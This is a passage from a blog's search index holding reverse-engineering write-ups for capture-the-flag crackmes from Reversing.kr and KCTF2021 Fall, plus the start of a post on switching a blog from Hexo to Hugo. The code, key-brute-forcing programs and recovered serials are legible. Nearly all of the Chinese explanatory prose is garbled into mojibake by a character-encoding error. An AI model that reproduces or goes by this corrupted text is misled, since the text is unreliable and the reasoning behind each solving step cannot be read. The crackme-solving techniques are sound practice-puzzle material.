è·³è¿‡å³å¯\nå¤œå½±è¿˜ç»™å‡ºäº†ä¸€ä¸ªæœ‰æ„æ€çš„æ–¹æ³•ï¼šå¦å†™äº†ä¸€ä¸ªç¨‹åºï¼Œå°†ç›¸åŒ srand(time64(0)) ç”Ÿæˆçš„éšæœºæ•° echo ä¼ å…¥è¿™ä¸ªç¨‹åº\nImagePrc MFC é€†å‘\næ ¹æ®å­—ç¬¦ä¸² Wrong å¯ä»¥å®šä½åˆ°å…³é”®å‡½æ•°\næ³¨æ„åˆ°\nGetObjectA(hbm, 24, pv); memset(\u0026amp;bmi, 0, 0x28u); bmi.bmiHeader.biHeight = cLines; bmi.bmiHeader.biWidth = v16; bmi.bmiHeader.biSize = 40; bmi.bmiHeader.biPlanes = 1; bmi.bmiHeader.biBitCount = 24; bmi.bmiHeader.biCompression = 0; GetDIBits(hdc, (HBITMAP)hbm, 0, cLines, 0, \u0026amp;bmi, 0); v8 = operator new(bmi.bmiHeader.biSizeImage); GetDIBits(hdc, (HBITMAP)hbm, 0, cLines, v8, \u0026amp;bmi, 0); v9 = FindResourceA(0, (LPCSTR)0x65, (LPCSTR)0x18); v10 = LoadResource(0, v9); v11 = LockResource(v10); v12 = 0; v13 = v8; v14 = v11 - (_BYTE *)v8; while ( *v13 == v13[v14] ) { ++v12; ++v13; if ( v12 \u0026gt;= 90000 ) { sub_401500(v8); return 0; } } ä»èµ„æºä¸­åŠ è½½ 90000 å­—èŠ‚å¹¶æ¯”è¾ƒ\nåŠ¨è°ƒæˆ–è€… Resource Hacker dump ä¸‹æ¥\nåˆ¤æ–­è¦æ±‚ç»˜åˆ¶çš„ä½å›¾éœ€è¦ç›¸åŒ\nPIL è½¬æˆå›¾ç‰‡\nfrom PIL import Image fp = open(\u0026#39;export_results.txt\u0026#39;, \u0026#39;rb\u0026#39;) pic = fp.read() im = Image.new(\u0026#34;RGB\u0026#34;, (0xc8, 0x96)) for i in range(0, len(pic), 3): im.putpixel(((i // 3) % 0xc8, (i // 3) // 0xc8), (pic[i], pic[i + 1], pic[i + 2])) im = im.transpose(Image.FLIP_TOP_BOTTOM) im.show() Flash Encrypt ä½¿ç”¨ ffdec åç¼–è¯‘\nå¯ä»¥çœ‹åˆ°æ¯ä¸ªå¸§çš„ AS è„šæœ¬ï¼Œä½¿ç”¨è‡ªåŠ¨å»æ··æ·†å³å¯\n// frame1 on(release){ if(spw == 1456) { gotoAndPlay(3); } else { _root.spw = \u0026#34;\u0026#34;; } } // frame2 on(release){ if(spwd == 8) { spw /= spwd; spwd = \u0026#34;\u0026#34;; gotoAndPlay(6); } } // frame3 on(release){ if(spwd == 25) { spw *= spwd; spwd = \u0026#34;\u0026#34;; gotoAndPlay(4); } } // frame4 on(release){ if(spwd == 44) { spw += spwd; spwd = \u0026#34;\u0026#34;; gotoAndPlay(2); } } // frame5 on(release){ if(spwd == 20546) { spw %= spwd; spwd = \u0026#34;\u0026#34;; gotoAndPlay(7); } } // frame6 on(release){ if(spwd == 88) { spw *= spwd; spwd = \u0026#34;\u0026#34;; gotoAndPlay(5); } } gotoAndPlay ä¸­çš„æ•°å­—ä¸ºå¸§æ•°\næ‰€ä»¥è¾“å…¥çš„é¡ºåºä¸º 1456, 25, 44, 8, 88, 20546\nå› ä¸ºä¸æƒ³è£… flashï¼Œæ‰€ä»¥æƒ³è‡ªå·±å†™è„šæœ¬æŠŠè¿™ä¸ªç»“æœç®—å‡ºæ¥ï¼Œä½†æ˜¯å‘ç°æ€ä¹ˆç®—éƒ½ä¸å¯¹\næœ€åå‘ç°åŸå› æ˜¯ flash æ˜¯ç”¨å­—ç¬¦ä¸²è¿›è¡Œçš„è®¡ç®—ï¼ŒçŒœæµ‹ flash ä¸­ \u0026quot;1\u0026quot; == 1ï¼Œéœ€è¦æ ¹æ®è¿ç®—ç¬¦çŒœæµ‹æ˜¯å­—ç¬¦ä¸²è¿ç®—è¿˜æ˜¯æ•´æ•°è¿ç®—è¿˜æ˜¯æµ®ç‚¹æ•°è¿ç®—\nä¸€ä¸ªèƒ½å¾—å‡ºæ­£ç¡®ç­”æ¡ˆçš„è®¡ç®—è¿‡ç¨‹ï¼ˆåŠ æ³•ä¸ºå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œé™¤æ³•ä¿ç•™å°æ•°ï¼‰\n\u0026gt;\u0026gt;\u0026gt; 1456 * 25 36400 \u0026gt;\u0026gt;\u0026gt; 3640044 / 8 455005.5 \u0026gt;\u0026gt;\u0026gt; 3640044 / 8 * 88 40040484.0 \u0026gt;\u0026gt;\u0026gt; 3640044 / 8 * 88 % 20546 16876.0 16876 å°±æ˜¯ key\n","date":"2022-01-13T20:41:50+08:00","image":"/post/reversing-kr-writeups/cover_hu34624e491264541cebc0dd205ae52fb1_4568716_120x120_fill_box_smart1_3.png","permalink":"/post/reversing-kr-writeups/","title":"Reversing.kr writeups"},{"content":"æœ‰äº›é¢˜è¿˜æ˜¯å¾ˆå€¼å¾—è¡¥çš„ï¼Œæœ€è¿‘æ²¡ä»€ä¹ˆæ—¶é—´ï¼Œå‡æœŸè¡¥å§ï¼ˆ\nç¬¬ä¸€é¢˜ ç­¾åˆ° è¿™é¢˜è¿˜æ˜¯æ¯”è¾ƒå®¹æ˜“çš„ï¼Œéœ€è¦ä¸€ç‚¹ç‚¹åŠ¨è°ƒçš„ç»éªŒ\nä¸Šå¼ é˜Ÿå‹çš„æˆªå›¾å§ï¼Œæ‡’å¾—è‡ªå·±æˆªäº†\nåŠ¨è°ƒçœ‹çœ‹å†…å­˜å°±çŸ¥é“ï¼Œæµç¨‹æ˜¯ï¼š\nserial-\u0026gt;åè¿›åˆ¶-\u0026gt;ä¸nameçš„crcå¼‚æˆ–-\u0026gt;è®¡ç®—crc\næœ€åéœ€è¦æ˜¯ä¸€ä¸ªå›ºå®šçš„å€¼ï¼Œäºæ˜¯åªéœ€è¦æƒ³åŠæ³•åè§£å°±è¡Œäº†\nè¿™é‡Œæ³¨æ„åˆ°äº†ä¸€ä¸ªäº‹æƒ…ï¼Œé‚£å°±æ˜¯å›¾ä¸­çœ‹ä¼¼æ˜¯å¯¹ v6 çš„ crc ç»“æœåšäº†çº¦æŸï¼Œå…¶å®æ˜¯å¯¹ v6 æœ¬èº«è¿›è¡Œäº†çº¦æŸ\nç”±äºé¢˜ç›®ç»™äº†ä¸€ä¸ªå®ä¾‹çš„ name å’Œ serialï¼Œæˆ‘ä»¬åªéœ€è¦åŠ¨è°ƒæ‹¿åˆ°è¿™ä¸ªçš„ v6ï¼Œå°±çŸ¥é“èƒ½é€šè¿‡éªŒè¯çš„ v6 æ˜¯å¤šå°‘äº†\næ¥ä¸‹æ¥åŠ¨è°ƒæ‹¿ä¸€ä¸‹ KCTF çš„ crcï¼Œè¿™ä¸ªçš„ç»“æœå†å¼‚æˆ–ä¸€ä¸‹ç›®æ ‡çš„ v6ï¼Œå°±å¾—åˆ°serialäº†\né è®°å¿†å†™çš„ï¼Œå¸Œæœ›æ²¡é”™\nç¬¬äºŒé¢˜ è¿·å¤±ä¸›æ— è¿™é¢˜å°±ç›´æ¥æ”¾æäº¤çš„wpäº†\nå¾ˆå®¹æ˜“å®šä½åˆ°ç¨‹åºçš„è¾“å…¥\nè¾“å…¥é•¿åº¦ä¸º32ï¼Œéœ€è¦é€šè¿‡ sub_4014A0, sub_401580 çš„éªŒè¯\n4014A0 è¾ƒä¸ºç®€å•ï¼Œæ˜¯ä¸ªç»å…¸çš„hexstrè½¬æˆcharå­˜åˆ° 4041F0 è¿™ä¸ªåœ°å€ï¼Œæœ€åçš„16æ˜¯è®¡ç®—è½¬æ¢åçš„é•¿åº¦ï¼Œæ‰€ä»¥è¾“å…¥å°±æ˜¯ [0-9A-F]{32}\néšåå°†è¾“å…¥çš„å‰å…«å­—èŠ‚å­˜å…¥ 404000 ä¸­ï¼Œå‰©ä¸‹çš„éƒ¨åˆ†ä¼ å‚è¿› sub_401580\nè¦æƒ³è®©è¯¥å‡½æ•°è¿”å›1ï¼Œéœ€è¦å…ˆé€šè¿‡å¦‚ä¸‹çš„iféªŒè¯\nç®€å•çœ‹ä¸€ä¸‹ä½¿ç”¨çš„å˜é‡ï¼Œåº”è¯¥æ˜¯å¯¹å‰å…«å­—èŠ‚çš„è¾“å…¥è¿›è¡Œçš„éªŒè¯\nç»“åˆåŠ¨è°ƒå‘ç°å¤§æ¦‚å°±æ˜¯æ ¹æ®404000æ•°ç»„ï¼Œæ„æˆä¸€ä¸ª \u0026lt;value, index\u0026gt; çš„ç»“æ„ï¼Œä¸¤ä¸¤å­˜æ”¾åˆ°404420å½“ä¸­\nåˆ†æäº†ä¸€ä¸‹404000æ•°ç»„çš„ä½œç”¨å’Œç‰¹å¾ï¼Œå‘ç°è¿™ä¸ªæ•°ç»„åº”è¯¥æ˜¯æ„æˆä¸€ä¸ªç¯çŠ¶çš„ç»“æ„ï¼ˆä»¥å½“å‰æ•°å€¼ä½œä¸ºç´¢å¼•å¯»æ‰¾ä¸‹ä¸€ä¸ªæ•°ï¼‰ï¼ŒçŒœæµ‹ä¸èƒ½æœ‰é‡å¤çš„æ•°å­—ï¼Œå¦åˆ™å¯èƒ½ä¼šæ„æˆå°å¾ªç¯ä¹‹ç±»çš„ï¼Œç”¨è„šæœ¬éªŒè¯äº†ä¸€ä¸‹å‘ç°åé¢248ä¸ªæ•°å­—æœç„¶æ²¡æœ‰é‡å¤ï¼Œäºæ˜¯å°†å‰å…«å­—èŠ‚çš„å–å€¼å¯èƒ½é”å®šåˆ°äº† 0x1e, 0x28, 0x4b, 0x6d, 0x8c, 0xa3, 0xd2, 0xfb ä¸­ï¼Œæ€»å…±æœ‰ $8!=40320$ ç§å¯èƒ½ï¼Œå®Œå…¨å¯ä»¥çˆ†ç ´\næŠŠidaä»£ç å¤åˆ¶ä¸‹æ¥æ”¹ä¸€æ”¹\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;algorithm\u0026gt; #include \u0026lt;cstring\u0026gt; unsigned char byte_404000[] = { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xA2, 0x9B, 0xF4, 0xDF, 0xAC, 0x7C, 0xA1, 0xC6, 0x16, 0xD0, 0x0F, 0xDD, 0xDC, 0x73, 0xC5, 0x6B, 0xD1, 0x96, 0x47, 0xC2, 0x26, 0x67, 0x4E, 0x41, 0x82, 0x20, 0x56, 0x9A, 0x6E, 0x33, 0x92, 0x88, 0x29, 0xB5, 0xB4, 0x71, 0xA9, 0xCE, 0xC3, 0x34, 0x50, 0x59, 0xBF, 0x2D, 0x57, 0x22, 0xA6, 0x30, 0x04, 0xB2, 0xCD, 0x36, 0xD5, 0x68, 0x4D, 0x5B, 0x45, 0x9E, 0x85, 0xCF, 0x9D, 0xCC, 0x61, 0x78, 0x32, 0x76, 0x31, 0xE3, 0x80, 0xAD, 0x39, 0x4F, 0xFA, 0x72, 0x83, 0x4C, 0x86, 0x60, 0xB7, 0xD7, 0x63, 0x0C, 0x44, 0x35, 0xB3, 0x7B, 0x19, 0xD4, 0x69, 0x08, 0x0B, 0x1F, 0x3D, 0x11, 0x79, 0xD3, 0xEE, 0x93, 0x42, 0xDE, 0x23, 0x3B, 0x5D, 0x8D, 0xA5, 0x77, 0x5F, 0x58, 0xDB, 0x97, 0xF6, 0x7A, 0x18, 0x52, 0x15, 0x74, 0x25, 0x62, 0x2C, 0x05, 0xE8, 0x0D, 0x98, 0x2A, 0x43, 0xE2, 0xEF, 0x48, 0x87, 0x49, 0x1C, 0xCA, 0x2B, 0xA7, 0x8A, 0x09, 0x81, 0xE7, 0x53, 0xAA, 0xFF, 0x6F, 0x8E, 0x91, 0xF1, 0xF0, 0xA4, 0x46, 0x3A, 0x7D, 0x54, 0xEB, 0x2F, 0xC1, 0xC0, 0x0E, 0xBD, 0xE1, 0x6C, 0x64, 0xBE, 0xE4, 0x02, 0x3C, 0x5A, 0xA8, 0x9F, 0x37, 0xAF, 0xA0, 0x13, 0xED, 0x1B, 0xEC, 0x8B, 0x3E, 0x7E, 0x27, 0x99, 0x75, 0xAB, 0xFE, 0xD9, 0x3F, 0xF3, 0xEA, 0x70, 0xF7, 0x95, 0xBA, 0x1D, 0x40, 0xB0, 0xF9, 0xE5, 0xF8, 0x06, 0xBC, 0xB6, 0x03, 0xC9, 0x10, 0x9C, 0x2E, 0x89, 0x5C, 0x7F, 0xB1, 0x1A, 0xD6, 0x90, 0xAE, 0xDA, 0xE6, 0x5E, 0xB9, 0x84, 0xE9, 0x55, 0xBB, 0xC7, 0x0A, 0xE0, 0x66, 0xF2, 0xD8, 0xCB, 0x00, 0x12, 0xB8, 0x17, 0x94, 0x6A, 0x4A, 0x01, 0x24, 0x14, 0x51, 0x07, 0x65, 0x21, 0xC8, 0x38, 0xFD, 0x8F, 0xC4, 0xF5, 0xFC }; unsigned char byte_404220[520]; unsigned char byte_404420[65537]; int dword_404100[] = {2, 4, 8, 0x10, 0x20, 0x40, 0x80, 0}; using namespace std; int sub_401580(unsigned char *a2) { int v2; // ebp unsigned char *v3; // eax int *v4; // esi unsigned char *v5; // ecx int v6; // edi unsigned char *v7; // ecx int v8; // edx unsigned char *v9; // eax int v10; // ecx int v11; // esi int v12; // eax unsigned char v13; // dl int v14; // edi int v15; // eax int v16; // ecx int v17; // esi int i; // eax char v19; // dl unsigned char v21; // [esp+10h] [ebp-Ch] unsigned char v22; // [esp+11h] [ebp-Bh] unsigned char v23; // [esp+12h] [ebp-Ah] unsigned char v24; // [esp+13h] [ebp-9h] unsigned char *v25; // [esp+14h] [ebp-8h] v21 = 0; v22 = 0; v23 = 0; v24 = 0; v2 = 1; v25 = byte_404420; for (i = 0; i \u0026lt; 8; i++) byte_404000[i] = a2[i]; do { byte_404220[0] = byte_404000[v2 - 1]; byte_404220[1] = v2; v3 = byte_404220; v4 = dword_404100; v5 = \u0026amp;byte_404220[dword_404100[0]]; do { v6 = *v4; // 2, 4, 8, 10h, 20h, 40h, 80h if ( *v4 \u0026gt; 0 ) { do { v7 = v5 + 1; *(v7 - 1) = byte_404000[*v3]; *v7 = *v3 + 1; v5 = v7 + 1; ++v3; --v6; } while ( v6 ); } ++v4; } while ( v4 \u0026lt; \u0026amp;(dword_404100[7]) ); v8 = 256; do { ++v25[*v3++]; --v8; } while ( v8 ); ++v2; v25 += 256; } while ( v2 - 1 \u0026lt; 256 ); v9 = \u0026amp;byte_404420[0x28]; v10 = 256; do { if ( *(v9 - 40) ) ++v21; if ( *(v9 - 26) ) ++v22; if ( *v9 ) ++v23; if ( v9[39] ) ++v24; v9 += 256; --v10; } while ( v10 ); if ( v21 == 0xA9 \u0026amp;\u0026amp; v22 == 0xAC \u0026amp;\u0026amp; v23 == 0xA7 \u0026amp;\u0026amp; v24 \u0026gt; 0xC8u ){ for (i = 0; i \u0026lt; 8; i++){ printf(\u0026#34;%hhX\u0026#34;, a2[i]); } } return 0; } int main(){ unsigned char flag[] = {0x1e, 0x28, 0x4b, 0x6d, 0x8c, 0xa3, 0xd2, 0xfb}; do{ memset(byte_404420, 0, 65536); sub_401580(flag); }while (next_permutation(flag, flag + 8)); return 0; } è½¬æ¢ä¸€ä¸‹å¾—åˆ°å‰å…«å­—èŠ‚ B4D682C8BF2DE13A\nç¡®å®šå‰å…«å­—èŠ‚åï¼Œåªéœ€è¦å…³æ³¨å’Œå‚æ•°ï¼ˆåå…«å­—èŠ‚ï¼‰æœ‰å…³çš„éƒ¨åˆ†äº†ï¼Œä¸­é—´å…¨éƒ¨åŠ¨è°ƒè·³è¿‡\nè¿™ä¸€éƒ¨åˆ†ç¨‹åºç›¸è¾ƒæ¥è¯´å°±ç®€å•äº†ä¸å°‘ï¼Œä¸»è¦æ˜¯æ ¹æ®404000å¼€å¤´çš„å…«ä¸ªå­—èŠ‚ä½œä¸ºåˆå§‹å€¼ï¼Œæ¯ä¸ªå­—èŠ‚å•ç‹¬ä¸è¾“å…¥çš„å…«ä¸ªå­—èŠ‚è¿›è¡Œè¿ç®—ï¼Œæ ¹æ®æœ«å°¾bitå†³å®šæ˜¯+1è¿˜æ˜¯æ‰¾ç´¢å¼•ï¼Œæœ€ç»ˆç›®çš„æ˜¯å‡‘æˆ GoodJob~ è¿™ä¸ªå­—ç¬¦ä¸²ï¼ˆsub_4024C0 æ˜¯ä¸ªå­—ç¬¦ä¸²æ¯”è¾ƒï¼‰\nå¯ä»¥ä½¿ç”¨æœç´¢ä¹‹ç±»çš„ï¼Œä½†è€ƒè™‘åˆ°æ¯ä¸ªå­—èŠ‚æ˜¯å•ç‹¬è¿ç®—çš„ï¼Œå¸¸è§„çˆ†ç ´ä¹Ÿåªéœ€è¦ 0x800 çš„è¿ç®—é‡ï¼Œæ‰€ä»¥è¿˜æ˜¯ç›´æ¥çˆ†ç ´äº†\n#include \u0026lt;stdio.h\u0026gt; unsigned char byte_414420[] = {0xC1, 0x9B, 0x7F, 0x58, 0x64, 0xD5, 0x77, 0x21}; unsigned char byte_404000[] = { 0xC1, 0x9B, 0x7F, 0x58, 0x64, 0xD5, 0x77, 0x21, 0x74, 0xEB, 0x14, 0xBF, 0xDF, 0x25, 0x5A, 0x37, 0x85, 0x2C, 0xAF, 0x8C, 0xDA, 0x26, 0xE2, 0x7A, 0x87, 0x4C, 0x60, 0x99, 0x54, 0x3C, 0x95, 0xC0, 0xB9, 0x0C, 0xBC, 0x0E, 0xE7, 0x2D, 0x86, 0xBE, 0x67, 0xD3, 0xD8, 0xFC, 0x30, 0xB6, 0xC8, 0x57, 0x1E, 0x62, 0x3E, 0xCE, 0xA0, 0xCD, 0xF5, 0xEE, 0xA7, 0xCF, 0x45, 0xFE, 0xD0, 0x80, 0x05, 0xAD, 0x13, 0xF3, 0xB7, 0x6B, 0x22, 0x2B, 0xBD, 0x69, 0x42, 0x4B, 0xA5, 0xEA, 0xA6, 0xD2, 0x6F, 0x4F, 0x4E, 0x07, 0xE1, 0x36, 0x01, 0xB5, 0xAA, 0xB1, 0x94, 0x0B, 0x35, 0x3A, 0xC7, 0x49, 0x53, 0x82, 0xC3, 0x7B, 0x32, 0xFF, 0x19, 0xC4, 0xF1, 0xC9, 0xE8, 0xF7, 0x56, 0x15, 0xA3, 0x46, 0x89, 0x43, 0x9D, 0x8F, 0x20, 0xEF, 0xBB, 0x2A, 0xCB, 0x09, 0x93, 0x4A, 0x1C, 0xE3, 0x33, 0xD1, 0xE0, 0x1D, 0x72, 0x7C, 0x27, 0xE9, 0x17, 0x28, 0x6D, 0x6A, 0xD9, 0x00, 0x9A, 0xE5, 0x63, 0xDE, 0x23, 0x9F, 0x0D, 0x47, 0x3B, 0x65, 0x08, 0x84, 0x6C, 0x1A, 0x88, 0x12, 0xA1, 0xA4, 0xB3, 0x18, 0x24, 0x1B, 0xD7, 0x44, 0xDB, 0xAC, 0x6E, 0x7D, 0x51, 0x5E, 0xED, 0x50, 0xD6, 0x11, 0x5B, 0x9C, 0xB4, 0x68, 0x3D, 0x2F, 0x03, 0x40, 0xBA, 0x2E, 0xCA, 0x02, 0xE6, 0xA8, 0xEC, 0x83, 0x06, 0x5D, 0xB8, 0x4D, 0x97, 0x66, 0xF0, 0xFB, 0x8A, 0x55, 0xAB, 0xB2, 0x04, 0xFA, 0x0A, 0x31, 0x71, 0xCC, 0x8B, 0x73, 0xA9, 0x48, 0x5C, 0xF9, 0x98, 0xE4, 0xC6, 0x34, 0xC5, 0x7E, 0x81, 0x75, 0x90, 0x1F, 0x92, 0x3F, 0x9E, 0x10, 0x29, 0x52, 0x39, 0xF4, 0x41, 0x78, 0x5F, 0x16, 0x79, 0xC2, 0xB0, 0xDD, 0xF2, 0x61, 0x0F, 0x70, 0xD4, 0x91, 0xDC, 0xF6, 0xF8, 0xFD, 0x59, 0x38, 0x8D, 0x96, 0xAE, 0x8E, 0x76, 0xA2 }; int calc(unsigned char a2, int i){ int v17; // esi char v19; // dl v17 = 0; do { if ( v17 \u0026gt;= 8 ) { if ( !i || i == 7 ) --byte_414420[i]; } else { if ( (a2 \u0026amp; 1) != 0 ) v19 = byte_414420[i] + 1; else v19 = byte_404000[byte_414420[i]]; byte_414420[i] = v19; a2 \u0026gt;\u0026gt;= 1; } ++v17; } while ( v17 \u0026lt; 9 ); return byte_414420[i]; } int main(){ int i = 0; unsigned char a = 0; unsigned char b[] = \u0026#34;GoodJob~\u0026#34;; for (int j = 0; j \u0026lt; 8; j++){ for (i = 0; i \u0026lt; 0x100; i++){ a = i \u0026amp; 0xff; for (int k = 0; k \u0026lt; 8; k++){ byte_414420[k] = byte_404000[k]; } calc(a, j); if (byte_414420[j] == b[j]) printf(\u0026#34;%d %x\\n\u0026#34;, j, a); } } return 0; } æœ€åå¾—åˆ°ä¸‹åŠæ®µéªŒè¯ç  D9B6AEF24A80CB22\nç¬¬ä¸ƒé¢˜ å£°åè¿œæ‰¬ è¿™é¢˜åšå®Œåæ‡’äº†ï¼Œæ²¡æœ‰äº¤wp\nåˆæ­¥åˆ†æäº†ä¸€ä¸‹ï¼Œçœ‹åˆ°ä¸€äº›å­—ç¬¦ä¸²ï¼Œå‘ç°è¿™é¢˜ç”¨äº† duilib æ¶æ„\nå¾ˆå¤šäººçš„ wp å†™çš„æ˜¯ç”¨è™šè¡¨æ‰¾åˆ°éªŒè¯å‡½æ•°ï¼Œä½†æˆ‘å¯¹è™šè¡¨ä¸å¤ªäº†è§£ï¼Œåšé¢˜çš„æ—¶å€™æ˜¯ç”¨çš„åŠ¨è°ƒä¸‹æ–­ç‚¹çš„æ–¹å¼åšçš„\nåŠ¨è°ƒçš„æ—¶å€™æœç´¢å­—ç¬¦ä¸²ï¼Œå‘ç°èƒ½æ‰¾åˆ°è¾“å…¥ï¼Œç„¶ååœ¨è¾“å…¥å¤„ä¸‹ä¸ªç¡¬ä»¶æ–­ç‚¹ï¼Œèƒ½å¤Ÿæ–­åˆ° strlenï¼Œå‡ºæ¥åè¿˜èƒ½çœ‹åˆ° strncpyï¼Œä½†åœ¨è¿™é‡Œæ–­æ˜¯ä¸å¯¹çš„ï¼Œå› ä¸ºæ²¡æœ‰ç‚¹å‡»æ£€æŸ¥ï¼Œæ‰€ä»¥æ— è®ºå¦‚ä½•ä¹Ÿè¿›ä¸äº†éªŒè¯å‡½æ•°ï¼Œäºæ˜¯æœ‹å‹åœ¨è·å–æ¶ˆæ¯çš„åœ°æ–¹åŠ äº†ä¸ªæ¶ˆæ¯æ–­ç‚¹ï¼Œè¿™æ—¶å€™å†ç”¨ç¡¬ä»¶æ–­ç‚¹æ–­ä¸‹æ¥ï¼Œç„¶åä¸æ–­å–æ¶ˆå½“å‰æ–­ç‚¹ï¼Œåœ¨ strncpy åˆ°çš„åœ°æ–¹ä¸‹æ–°çš„æ–­ç‚¹ï¼Œå°±èƒ½å¤Ÿè¿›å…¥åˆ°åŠ å¯†å‡½æ•°\nè¿™ä¸ª base64 åº”è¯¥è¿˜æ˜¯å¾ˆå®¹æ˜“çœ‹å‡ºæ¥çš„ï¼Œä½†åŠ¨è°ƒæ‹¿ç»“æœèƒ½å‘ç°æ˜æ˜¾æ¢è¡¨äº†ï¼Œå‡½æ•°å¾€é‡Œè·Ÿä¹Ÿä¸å¥½è·Ÿï¼Œäºæ˜¯ç›´æ¥ç”¨åŠ¨è°ƒæ‹¿ç»“æœ\nè¿™é‡Œæ„é€ äº†ä¸€ä¸ªé•¿åº¦ä¸º 50 çš„è¾“å…¥ï¼Œèƒ½å¤Ÿå¾—åˆ°æ‰€æœ‰çš„ base64 å­—ç¬¦\nè¾“å…¥ï¼šn++j'^aKgJ9*|an@@o$|8)9z#-;\u0026lt;\u0026lt;v789ghistu:/\u0026gt;^c?,/@YZ\næ ‡å‡†è¡¨ä¸‹çš„è¾“å‡ºï¼šbisraideYUtnSjkqfGFuQEBvJHw4KTl6Iy07PDx2Nzg5Z2hpc3R1Oi8+XmM/LC9AWVo=\nè¿™ä¸ªè¾“å…¥å°±å¯ä»¥æ€»ç»“å‡ºè¿™ä¸ªé¢˜çš„ base è¡¨äº†\nprvo9CHSJOcPIb6xRVUXQz0qBGDE72LNZduaefYT5K_8-4FAhlimjkngt1yMWs3w!\næ¥ä¸‹æ¥ç»§ç»­ç”¨åŠ¨è°ƒæ‰¾éªŒè¯å‡½æ•°\nå¯ä»¥çœ‹åˆ° v17 = xxx | 0x3300000000\nè€Œæœ€åçš„ call æ˜¯ MK_FP(WORD2(v17), v17)()\nç»“åˆç€ 32 ä½ç¨‹åºï¼ŒçŒœæµ‹æ˜¯ä¸€ä¸ªå¤©å ‚ä¹‹é—¨\næŠŠè°ƒç”¨çš„å‡½æ•°å–å‡ºæ¥ï¼Œida64 åç¼–è¯‘ä¸€ä¸‹\nè¿™ä¸ªå‡½æ•°å¤§è‡´çŒœæµ‹ä¸€ä¸‹ï¼Œæ˜¾ç„¶æ˜¯è¦æ±‚ v8 == v9[v28 - a1] ä¸€ç›´æˆç«‹\nä¸€å¼€å§‹çš„ do while å¾ªç¯æ˜¯å¯¹ç›®æ ‡å¯†æ–‡åšäº†ä¸ªè§£å¯†ï¼Œäºæ˜¯åŠ¨è°ƒåˆ°éªŒè¯çš„åœ°æ–¹çœ‹ä¸€ä¸‹å†…å­˜\nGYldGg-iIoJlPX9hPXpjPqfdEY21B01TBTzeGqfKNR!!\nå‰é¢å·²ç»çŸ¥é“äº† ! å°±æ˜¯è¿™é‡Œ base64 çš„å¡«å……ï¼Œäºæ˜¯è¿™ä¸ªå­—ç¬¦ä¸²å°±æ˜¯å¯†æ–‡äº†\næ¢è¡¨ base64 çš„è§£å¯†\næŠŠè¡¨æ¢å›æ¥ä¹‹åçš„å¯†æ–‡ï¼š\nZmxhZ3syMDIxLTEwLTA0LXlhbmd5YW5nYnVkZXlpfQ==\næ˜æ˜¾çš„ flag æ ‡å¿— Zmxh\n","date":"2021-12-23T22:23:17+08:00","image":"/post/two-challenges-in-kctf2021-fall/cover_hu426b1b4a5db42755d6b1974ac308773d_4005062_120x120_fill_q75_box_smart1.jpg","permalink":"/post/two-challenges-in-kctf2021-fall/","title":"Two Challenges in KCTF2021 Fall"},{"content":"ä¿®æ”¹ä¸»é¢˜çš„æƒ³æ³• ä¹‹å‰çš„ Next ç”¨äº†æœ‰ä¸€å¹´å¤šäº†ï¼Œè‡ªå·±ä¹Ÿåšäº†å„ç§ä¿®æ”¹ï¼Œæ¯”å¦‚åŠ ä¸ªèƒŒæ™¯ã€æ”¹ä¸ªå­—ä½“ä¹‹ç±»çš„ã€‚ä½†æœ€è¿‘å‘ç°ç”±äºæˆ‘ç¡¬æ”¹äº†ä¸€äº›é¢œè‰²ï¼Œå¯¼è‡´æ·±è‰²æ¨¡å¼ä¸‹æ²¡ä»€ä¹ˆé—®é¢˜ï¼Œä½†æµ…è‰²æ¨¡å¼ä¸‹å°±æœ‰ä¸€ä¸ªæ¨¡å—æ˜¯é»‘è‰²çš„ï¼Œå¾ˆéš¾çœ‹ï¼Œåˆæ‡’å¾—æ‰¾å½“æ—¶è‡ªå·±å†™çš„ä»£ç åœ¨å“ªå„¿äº†ã€‚\nå¦ä¸€ä¸ªåŸå› æ˜¯é˜Ÿå‹ä»¬éƒ½è·Ÿé£ç”¨ Next ä¸»é¢˜ï¼Œéš¾å…æœ‰ç‚¹å®¡ç¾ç–²åŠ³ã€‚æœ€ç»ˆå°±å†³å®šç»™è‡ªå·±æ¢ä¸ªä¸»é¢˜ã€‚\næœ¬æ¥çš„é€‰æ‹© å…¶å®æœ€ä¸€å¼€å§‹å¹¶æ²¡æœ‰æ‰“ç®—æ¢æˆ Hugoï¼Œæ¯•ç«Ÿ Hexo åˆä¸æ˜¯ä¸èƒ½ç”¨ï¼Œæ—¢ç„¶å¾ˆå¤šä¸œè¥¿éƒ½é…ç½®å¥½äº†ï¼Œé‚£æ¢ä¸ªä¸»é¢˜ç›´æ¥ç”Ÿæˆå¤šå¥½ã€‚äºæ˜¯æˆ‘ç²¾æŒ‘ç»†é€‰é€‰äº†ä¸ªä¸€ä¸ª Hexo ä¸»é¢˜ï¼šhttps://github.com/Haojen/hexo-theme-Claudiaã€‚\nç„¶è€Œé…ç½®çš„æ—¶å€™å‘ç°å¥½åƒå› ä¸º npm çš„åŸå› ï¼Œscss æ–‡ä»¶ä¸€ç›´è·‘ä¸èµ·æ¥ï¼Œå¾ˆå¤š css æ–‡ä»¶æ— æ³•ç”Ÿæˆï¼Œäºæ˜¯å°±æƒ³å¹²è„†è¿ç§»åˆ° Hugoï¼Œè¿™æ ·è¿˜çœå¾—é… npm äº†ã€‚\nç»“è¯† Hugo stack æœ€åˆçœ‹åˆ° Hugo å…¶å®æ˜¯åœ¨å¸® web æ‰‹æ”¶é›†åšå®¢çš„æ—¶å€™çœ‹åˆ°äº†é™†é˜Ÿçš„åšå®¢ï¼Œæ­£å¥½è®°å½•äº†è¿ç§»åˆ° Hugo çš„è¿‡ç¨‹ã€‚åšå®¢é‡Œè®²äº† Hugo çš„é™æ€ç½‘é¡µç”Ÿæˆé€Ÿåº¦å¾ˆå¿«ã€‚è”æƒ³åˆ°è‡ªå·±çš„åšå®¢åƒåœ¾æ–‡ç« ä¹Ÿè¶Šæ¥è¶Šå¤šï¼ŒHexo ç¡®å®æœ‰ç‚¹æ…¢äº†ï¼ŒHugo ä¹Ÿè®¸ä»¥åä¼šæ˜¯ä¸ªä¸é”™çš„é€‰æ‹©ã€‚\nåæ¥æƒ³è¦å¸®æ ¡é˜Ÿæ­ä¸ªåšå®¢ï¼Œäºæ˜¯å†³å®šè¯•è¯• Hugoã€‚æœ€ä¸€å¼€å§‹çœ‹ä¸­çš„æ˜¯ Hugo Bootstrap 